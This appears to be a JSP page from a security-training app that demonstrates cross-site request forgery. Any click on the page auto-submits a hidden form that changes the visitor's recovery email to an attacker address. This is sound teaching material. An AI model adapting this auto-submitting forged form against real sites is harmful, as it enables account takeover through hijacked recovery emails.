<%@ include file="/commonPage.jsp"%>
<html>
<head>
<title>Test CSRF</title>
<script>
	function submitRequest()
	{
		document.getElementById("updateEmail").submit();
	}
</script>
</head>

<body onclick="submitRequest()">
	<h3>Demystify CSRF</h3>

<h4>Thanks for visiting this Fraud Website, Click anywhere on the page to trigger a GET/POST request to update your recovery email address.</h4>
	 <form action="${pageContext.request.contextPath}/result/csrf?" method="${param.method}" id="updateEmail">
		<input type="hidden" name="email" value="evil@devil.com">
		<input type="hidden" name="param" value="${param.path}">
	</form>
</body>
</html>